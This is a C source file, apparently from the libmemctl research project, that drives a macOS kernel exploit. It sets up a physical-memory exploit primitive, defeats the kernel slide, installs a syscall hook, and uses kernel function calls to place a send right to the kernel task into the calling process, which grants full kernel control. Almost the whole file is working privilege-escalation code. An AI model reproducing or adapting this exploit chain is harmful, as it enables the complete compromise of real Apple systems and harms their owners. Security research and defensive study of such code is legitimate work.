/*
 * core.c
 * Brandon Azad
 *
 * Implementation of libmemctl's core_load.
 */
#include "fail.h"
#include "kernel_image.h"
#include "kernel_slide.h"
#include "physmem.h"
#include "syscall_hook.h"

#include "memctl/core.h"
#include "memctl/kernel.h"

#include <stdarg.h>
#include <stdio.h>

bool core_load() {
	// Initialize the kernel subsystem so we can resolve symbols. Because we do this before we
	// know the kernel_slide, the addresses resolved will not be slid until we re-initialize
	// with the correct kernel_slide.
	if (!kernel_init(NULL)) {
		return false;
	}
	// Initialize the exploit.
	physmem_init();
	probe_kernel_slide();
	kernel_init(NULL); // Re-initialize libmemctl's kernel subsystem.
	syscall_hook_install();
	// Resolve symbols.
	kaddr_t _kernel_task           = kernel_symbol("_kernel_task");
	kaddr_t _task_reference        = kernel_symbol("_task_reference");
	kaddr_t _convert_task_to_port  = kernel_symbol("_convert_task_to_port");
	kaddr_t _get_task_ipcspace     = kernel_symbol("_get_task_ipcspace");
	kaddr_t _current_task          = kernel_symbol("_current_task");
	kaddr_t _ipc_port_copyout_send = kernel_symbol("_ipc_port_copyout_send");
	// Get the kernel task pointer.
	kaddr_t kernel_task_ptr = kern_read(_kernel_task, sizeof(kaddr_t));
	// Get the IPC space for the current task.
	kaddr_t current_task = syscall_kernel_call(_current_task, 0, 0, 0, 0, 0);
	kaddr_t space = syscall_kernel_call(_get_task_ipcspace, current_task, 0, 0, 0, 0);
	// Create a send right for the kernel task.
	syscall_kernel_call(_task_reference, kernel_task_ptr, 0, 0, 0, 0);
	kaddr_t send_right = syscall_kernel_call(_convert_task_to_port, kernel_task_ptr, 0, 0, 0, 0);
	// Add the send right to the current task.
	kernel_task = syscall_kernel_call(_ipc_port_copyout_send, send_right, space, 0, 0, 0);
	if (kernel_task == MACH_PORT_NULL) {
		FAIL("could not get send right to kernel task");
	}
	// Clean up.
	syscall_hook_remove();
	physmem_deinit();
	return true;
}

// On failure, just exit. This simplifies the code, since we don't need to handle error
// propagation.
void noreturn fail(const char *format, ...) {
	static bool recursive = false;
	va_list ap;
	va_start(ap, format);
	vfprintf(stderr, format, ap);
	va_end(ap);
	// Uninstall the syscall hook if this isn't a recursive failure.
	if (!recursive) {
		recursive = true;
		syscall_hook_remove();
	}
	exit(1);
}
